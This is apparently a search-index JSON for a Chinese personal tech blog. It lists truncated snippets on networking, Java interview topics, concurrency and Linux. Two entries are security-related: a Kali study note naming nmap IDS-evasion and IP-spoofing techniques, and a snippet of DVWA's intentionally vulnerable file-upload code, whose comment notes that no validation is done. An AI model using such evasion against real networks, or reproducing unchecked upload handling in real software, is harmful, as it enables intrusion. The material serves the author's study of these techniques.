[{"content":"arp 协议原理 一、什么是ARP协议 ARP协议，全称“Address Resolution Protocol”,中文名是地址解析协议，使用ARP协议可实现通过IP地址获","lvl0":"arp协议原理","lvl1":null,"lvl2":"摘要","objectID":"36880c0e32cdabe7c7d944055ae9a46f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86/"},{"content":"1. web及网络基础 1.1. 通过HTTP访问web[C/S] 1.2. TCP/IP四层模型 1.2.1. 数据包的封装 1.3. TCP/IP协议族 1.3.1. 负责传输的IP协议 使用ARP协","lvl0":"http-basics","lvl1":null,"lvl2":"摘要","objectID":"1ae89460665ba135bd74cb290b2cdda0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-basics/"},{"content":"4. HTTP状态码 状态码即服务器返回的请求结果。 状态码 类型 说明 1xx Informational(信息性状态码) 接收的请求正在处理 2xx Success(","lvl0":"http-code","lvl1":null,"lvl2":"摘要","objectID":"26c4401db2a2b3a3749bd8751a010223","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-code/"},{"content":"我们了解了 HTTP 报文的结构，知道一个 HTTP 报文是由“header+body”组成的。但那时我们主要研究的是 header，没有涉及到 body。所以，“","lvl0":"http实体数据","lvl1":null,"lvl2":"摘要","objectID":"a4b68d397b09a307a35c5a43cb488441","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/http%E5%AE%9E%E4%BD%93%E6%95%B0%E6%8D%AE/"},{"content":"1. IP基础 TCP/IP的心脏是互联网层，这一层主要有IP和ICMP两个协议组成，在OSI参考模型中为第三层（网络层）。网络层的主要作用是实现","lvl0":"ip","lvl1":null,"lvl2":"摘要","objectID":"d9019ed025b3fc8c0b5d7464018bc237","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/ip/"},{"content":"TCP/IP 网络分层模型 还是先从 TCP/IP 协议开始讲起，一是因为它非常经典，二是因为它是目前事实上的网络通信标准，研究它的实用价值最大。 TCP/IP 当初的设计者真的是非","lvl0":"tcp 和 ip 分层","lvl1":null,"lvl2":"摘要","objectID":"98ffe04df79608a8b72b5921279b1902","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcp-ip%E5%88%86%E5%B1%82/"},{"content":"1. 基础知识 1.1. 协议 计算机与网络设备要相互通信，必须基于相同的方法。比如，如何探测到通信目标，使用哪种语言通信，如何结束通信等规则要事先确定。 不","lvl0":"tcp-basics","lvl1":null,"lvl2":"摘要","objectID":"64e39b2dd92dee344e0850cccffc5c49","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/tcpip-basics/"},{"content":"3. HTTP报文 3.1. HTTP报文 用于HTTP协议交互的信息被称为HTTP报文，客户端的HTTP报文叫做请求报文，服务端的叫做响应报文。报文大致分","lvl0":"tcp-message","lvl1":null,"lvl2":"摘要","objectID":"7a383dad4ed45ea6ad0c55907a52a284","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-message/"},{"content":"1. 传输层的作用 1.1. 传输层的定义 IP首部有个协议字段，用来标识传输层协议，识别数据是TCP的内容还是UDP的内容。同样，传输层，为了识别数据应该","lvl0":"tcp/udp","lvl1":null,"lvl2":"摘要","objectID":"2b2d272d71def43041b7d26b572eba53","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/tcp-udp/"},{"content":"内存条 内存条基本原理","lvl0":"电脑_内存条","lvl1":null,"lvl2":"摘要","objectID":"0bbb72cb1a675a5494beefbdb7fff382","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E5%86%85%E5%AD%98%E6%9D%A1/"},{"content":"宽带原理 网速概念 1byte = 8Bit 100M 的宽带理论下载速度是 12.5M/s 4M 的宽带理论下载速度是 512kb/s 这个 兆 是指 Bit ，是100M bit ， 不是100M 字节，所以，要除于8 比如 1M 的宽","lvl0":"电脑_宽带原理","lvl1":null,"lvl2":"摘要","objectID":"8106538a096fe43616552c5587e69b43","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E5%AE%BD%E5%B8%A6/"},{"content":"显卡的原理 显卡是游戏最重要的配置，主板，CPU性能可以低一点点，但是显卡达不到游戏的最低配置也没办法玩游戏 显卡生厂商 英伟达(navidia)","lvl0":"电脑_显卡","lvl1":null,"lvl2":"摘要","objectID":"894117d9004555d8032dbbc8e17eb559","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E6%98%BE%E5%8D%A1/"},{"content":"协议三要素 当然，这种协议还是更接近人类语言，机器不能直接读懂，需要进行翻译，翻译的工作教给编译器，也就是程序员常说的 compile。这个过程","lvl0":"网络协议_","lvl1":null,"lvl2":"摘要","objectID":"b92e39eae908e0c5d32f7906b9c13e0e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE_/"},{"content":"作者：peonyX 链接：https://www.nowcoder.com/discuss/723383?source_id=profile_","lvl0":"计算机网络八股文","lvl1":null,"lvl2":"摘要","objectID":"6310dc2f644fc49d4569946b676bd093","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"TCP 协议是“Transmission Control Protocol”的缩写，意思是“传输控制协议”，它位于 IP 协议之上，基于 IP 协议提供可靠的、字节流形式的通","lvl0":"计算机网络简介","lvl1":null,"lvl2":"摘要","objectID":"0196fbfc3ee4f9becf0ce56ed58619e0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/http%E7%AE%80%E4%BB%8B/"},{"content":"一个长度为 n−1 的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围 $0 $ 到 $ n−1 $ 之内。 在范围 0 到 n−1 的 n 个数字中有且只有一个数字","lvl0":"0到n-1中缺失的数字","lvl1":null,"lvl2":"摘要","objectID":"375ca2d480848aeb1e2910d2a0320657","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/0%E5%88%B0n-1%E4%B8%AD%E7%BC%BA%E5%A4%B1%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"JAVA 语言基础 StringBuilder buffer ,String 区别 线程安全 string不可变 final 修饰，线程安全 buffer 安全 ，用了 syncrhonized 同步 ，可变字符串 builder 没有锁，不安全 可变 string 是 底层用了个 final 的 char 数组，不","lvl0":"1.语言基础","lvl1":["八股文"],"lvl2":"摘要","objectID":"899622bed64e935d412a62adf0178826","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/1.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"content":"192. 统计词频 Difficulty: 中等 写一个 bash 脚本以统计一个文本文件 words.txt 中每个单词出现的频率。 为了简单起见，你可以假设： words.txt只包括小写字母和 ' ' 。 每个","lvl0":"192.统计词语频率","lvl1":["linux"],"lvl2":"摘要","objectID":"101f9a6891360c2c433624dc59ce0b49","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/192.%E7%BB%9F%E8%AE%A1%E8%AF%8D%E9%A2%91/"},{"content":"193. 有效电话号码 Difficulty: 简单 给定一个包含电话号码列表（一行一个电话号码）的文本文件 file.txt，写一个单行 bash 脚本输出所有有效的电话号码。 你可以假","lvl0":"193. 有效电话","lvl1":["linux"],"lvl2":"摘要","objectID":"36a0e9403adef950efcd96273f474134","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/193.%E6%9C%89%E6%95%88%E7%94%B5%E8%AF%9D/"},{"content":"194. 转置文件 Difficulty: 中等 给定一个文件 file.txt，转置它的内容。 你可以假设每行列数相同，并且每个字段由 ' ' 分隔。 示例： 假设 file.txt 文件内容如下： 1 2 3","lvl0":"194.转置文件","lvl1":["linux"],"lvl2":"摘要","objectID":"b01baee6fb407bfc2a1137a709a481a3","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A1%8C%E8%BD%AC%E5%88%97/"},{"content":"195. 第十行 Difficulty: 简单 给定一个文本文件 file.txt，请只打印这个文件中的第十行。 示例: 假设 file.txt 有如下内容： 1 2 3 4 5 6 7 8 9 10 Line 1 Line 2 Line 3 Line 4 Line 5","lvl0":"195.第十行","lvl1":["linux"],"lvl2":"摘要","objectID":"3e322cba08128d31ddc65e62a4d10768","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/%E7%AC%AC10%E8%A1%8C/"},{"content":"内存布局 常见的垃圾回收算法 GC 的一些名词 Minor GC 新生代空间，eden,survivor 区域回收的叫做minor GC Major GC 清理Tenured区， 用于回收","lvl0":"2.java gc 垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"87a4882f03380ae65cc44646d14f8fbc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/2.java-gc/"},{"content":"重新 equals 一定要重新 hashCode 并发编程三要素 原子性，不可分割 有序性， 程序执行顺序和代码顺序保持一致 可见性【可用性】， 一个线程对共享变量的修改，另一个线程","lvl0":"3.java语言八股","lvl1":null,"lvl2":"摘要","objectID":"a4adfb135417bca38f3402da760a0b2d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/3.java%E8%AF%AD%E8%A8%80%E5%85%AB%E8%82%A1/"},{"content":"jvm加载类的过程 一句话解释清楚整个过程 先加载 class 进内存 对 class信息内容进行语法校验，判断是否有错误 对静态变量初始化 调用构造器 初始化实例 加","lvl0":"4.JVM 加载类的方式，内存分布","lvl1":null,"lvl2":"摘要","objectID":"e09fd417a708b20e643634d4bcec5078","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/4.jvm%E5%8A%A0%E8%BD%BD%E7%B1%BB/"},{"content":"4399挂经总结 非常总要的部分 【ip知识点】 计算IP 的5连问 IP 计算总结 ip 可以用一个 32位的整数来存储 计算公式： 多少个0 ，就是 2的多少次方， 比","lvl0":"4399挂经","lvl1":null,"lvl2":"摘要","objectID":"2bdd37a94fd65c9d53cae87677f6fcc5","tags":["选择题刷题笔记","做题家速成"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/4399%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/"},{"content":"hashMap JDK 1.7 jdk1.7 hashMap put 位运算公式 $index = h\u0026amp;(array.length-1)$ array.length 是 2的幂的时候， 相当于 $index=h % array.length$ 默认容量为 16 【初始化】 面试宝典 视频 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24","lvl0":"5.集合相关问题","lvl1":["八股文"],"lvl2":"摘要","objectID":"db8437d8eb8289796c2bccbade4e6037","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/5.%E9%9B%86%E5%90%88%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"},{"content":"Kafka如何实现高性能IO？ 总结 批量消息提升服务器处理能力【buffer缓存】 使用批量消息提升服务端处理能力 我们知道，批量处理是一种非常有","lvl0":"apache_kafaka原理","lvl1":["消息队列"],"lvl2":"摘要","objectID":"102ad2b5a1888d545b79b7e4beee1e55","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/apache_kafaka%E9%AB%98%E6%80%A7%E8%83%BDio%E5%8E%9F%E7%90%86/"},{"content":"AQS 实现原理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 static final class Node { // waitStatus值 static final int CANCELLED = 1; static final int SIGNAL = -1; static final int CONDITION = -2; static final int PROPAGATE = -3; // 节点的","lvl0":"AQS源码问题","lvl1":null,"lvl2":"摘要","objectID":"cf20f4e5dace9e5bcf69c2ddae764eb6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/aqs%E6%BA%90%E7%A0%81%E9%97%AE%E9%A2%98/"},{"content":"ip 用 int 表示，4个字节，mac 地址记住是 6个字节 看这个图，我们要记住，只要是 6个字节的，字节说是 MAC 地址 看这个图，如果类型是： 0800 -\u0026gt; ip数据包 0806 -\u0026gt;","lvl0":"arp协议等原理","lvl1":null,"lvl2":"摘要","objectID":"370c82658df3c7e15d4fedaaaa621777","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/arp%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E7%AD%89/"},{"content":"balking 模式理解 我们提到可以用“多线程版本的 if”来理解 Guarded Suspension 模式，不同于单线程中的 if，这个“多线程版本的 if”是需要等待的，而且还很执着，必须要","lvl0":"balking模式","lvl1":null,"lvl2":"摘要","objectID":"f8469ff7d439cdf62ae181e8326fd3f7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/balking%E6%A8%A1%E5%BC%8F/"},{"content":"linux 系统中一般默认使用 bash， 文件开头需要些 #! /bin/bash , 指定 bash为脚本解释器 运行的几种方式： 可执行文件执行，需要脚本有执行权限 chmod + x test.sh \u0026amp;\u0026amp; ./test.sh 解释","lvl0":"bash基础","lvl1":null,"lvl2":"摘要","objectID":"195e8386e71235363cb33814c0e31c31","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/"},{"content":"bean是生命周期 主要有四个，实例化Instantiation，属性赋值Populate，初始化Initialization，销毁Destr","lvl0":"bean的生命周期","lvl1":null,"lvl2":"摘要","objectID":"1b6e3eaa39f53d6f37b1596dce4e7a3f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"CompletableFuture 原理 异步化，是并行方案得以实施的基础，更深入地讲其实就是：利用多线程优化性能这个核心方案得以实施的基础。看到这里，相信你应该就能理解异步编","lvl0":"completableFuture","lvl1":null,"lvl2":"摘要","objectID":"49609d39ce5848acf545652634e19265","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/completablefuture/"},{"content":"completionService 的使用方法 如何批量执行异步任务？ 利用 CompletionService 可以快速实现 Forking 这种集群模式，比如下面的示例代码就展示了具体是如何实现的。首先我们创建了一个线程池 executor 、","lvl0":"completionService","lvl1":null,"lvl2":"摘要","objectID":"984025fdf45652bd87ab961257bebd36","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/completionservice/"},{"content":"如果对数据有强一致要求，则需使用 Hashtable；在大部分场景通常都是弱一致性的情况下，使用 ConcurrentHashMap 即可；如果数据量在千万级别，且存在大量增删改","lvl0":"concurrentHashMap使用场景","lvl1":null,"lvl2":"摘要","objectID":"c42e7faeeae6e5abae1494864e20f820","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/concurrenthashmap%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/"},{"content":"Cond并发原语学习 Java 面试中，经常被问到的一个知识点就是等待 / 通知（wait/notify）机制。面试官经常 会这样考察候选人：请实现一个限定","lvl0":"Cond 等待通知机制","lvl1":null,"lvl2":"摘要","objectID":"8e59bddd54336894dfa13e5bf32202dc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/cond/"},{"content":"context 学习 比如，服务端接收到客户端的 HTTP 请求之后，可以把客户端的 IP 地址和端口、客户端的 身份信息、请求接收的时间、Trace ID 等信息放入到上下文中，","lvl0":"context","lvl1":null,"lvl2":"摘要","objectID":"ce4be3c8628a7d973b83c07dcc7669d1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/context/"},{"content":"CopyOnWrite模式 Java 里 String 这个类在实现 replace() 方法的时候，并没有更改原字符串里面 value[] 数组的内容，而是创建了一个新字符串，这种方法在解决不可变对","lvl0":"CopyOnWrite模式","lvl1":null,"lvl2":"摘要","objectID":"a5199d136a3bcc0a387fafa9fc139ce7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/copyonwrite/"},{"content":"open 函数 api学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // #include\u0026lt;bits/stdc++.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt;#include\u0026lt;sys/stat.h\u0026gt;#include\u0026lt;fcntl.h\u0026gt;#include\u0026lt;unistd.h\u0026gt;#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; // #include \u0026lt;iostream\u0026gt; // using namespace std; int main(void) { int fd = 0; //打开 已经存在的文件 fd","lvl0":"cpp学习和使用【文件api使用】","lvl1":null,"lvl2":"摘要","objectID":"f7c7e567d8b5211dacfb6bf273899312","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/cpp%E5%AD%A6%E4%B9%A0/"},{"content":"cpu 和 内存的关系 学习视频","lvl0":"cpu程序设计","lvl1":["八股文"],"lvl2":"摘要","objectID":"36283245765588411c4d67bbc239ba71","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/cpu%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"content":"应用程序内存基本构成 一个应用程序的内存基本上由：栈区、堆区、数据区（静态存储区）和程序代码区组成。 栈区（Stack Sagment） 在调用函数","lvl0":"c语言基础原理","lvl1":null,"lvl2":"摘要","objectID":"6b3192b2fffcdcaaa9c5b5814e2a50a2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/"},{"content":"这是我自己做学习的笔记，请不要拿来做坏事 [TOC] nmap 扫描漏洞 分片 IP诱骗/伪装 指定源端口 扫描延时 其他技术 采用欺骗的方式来进行IDS规避 nmap -v(详细的","lvl0":"db_nmap","lvl1":null,"lvl2":"摘要","objectID":"b4c46e042b50534d5027543dfb56b867","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/db_nmap/"},{"content":"dhclient 命令原理 1，触发获取IP dhclient 2，查看获取结果 cat /var/lib/dhclient/dhclient.leases 3, 释放IP dhclient -r dhclient命令使用 释放端口： dhclient eth0 －r 获取dhcp地址： dhclient eth0 －v 删除所有端","lvl0":"dhclient命令原理","lvl1":["linux"],"lvl2":"摘要","objectID":"82d6e954cb6939c6bab76c4c87a17448","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/dhclient/"},{"content":"disruptor 框架介绍 ArrayBlockingQueue 和 LinkedBlockingQueue，它们都是基于 ReentrantLock 实现的，在高并发场景下，锁的效率并不高，那有没有更好的替代品呢？有，今天","lvl0":"disruptor","lvl1":null,"lvl2":"摘要","objectID":"d267b9f090b74dffde8218fd3afdca2b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/disruptor/"},{"content":"什么是dockerfile 为开发团队提供完全一致的开发环境 拿所构建的镜像通过 Dockerfile文件构建一个新的镜像开始工作 部署时，无缝移植","lvl0":"dockerfile原理","lvl1":null,"lvl2":"摘要","objectID":"83f88ec124bd88efaf27ef37e18d4464","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/dockerfile%E5%8E%9F%E7%90%86/"},{"content":"先对代码进行分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#34;hackable/uploads/\u0026#34;; $target_path .= basename( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ] ); // 这边没有做任何监测","lvl0":"easy难度注入靶机","lvl1":null,"lvl2":"摘要","objectID":"da8c1e8b8b0f2e5145965badaf9485a9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/easy%E9%9A%BE%E5%BA%A6_%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95/"},{"content":"eggjs 学习总结 生成验证码 1 2 3 4 yarn add svg-captcha yarn add cookie-parser 添加session 支持 1 2 yarn add egg-session 验证码跨域问题解决 这个贼坑， cookie 讲究同源策略，要相同端口相同域名， 我的","lvl0":"eggjs学习记录","lvl1":null,"lvl2":"摘要","objectID":"89f082d217905b4df92d100ac0d14222","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/koa%E6%80%BB%E7%BB%93/eggjs%E5%AD%A6%E4%B9%A0/"},{"content":"学习目标 poll函数 epoll 多路IO 模型 了解 epoll 反应堆模式设计 看懂 epoll 反应堆模型实现代码 epoll 的两种模式 水平触发： 高电平代表1 只要缓冲区有数据，就一直通知","lvl0":"epoll学习","lvl1":null,"lvl2":"摘要","objectID":"22cd5f90f980f5152e41fd56ef5e6271","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/epoll-%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"},{"content":"frp 内网穿透命令 解压 这个 frp的压缩包到服务器 有个 frps 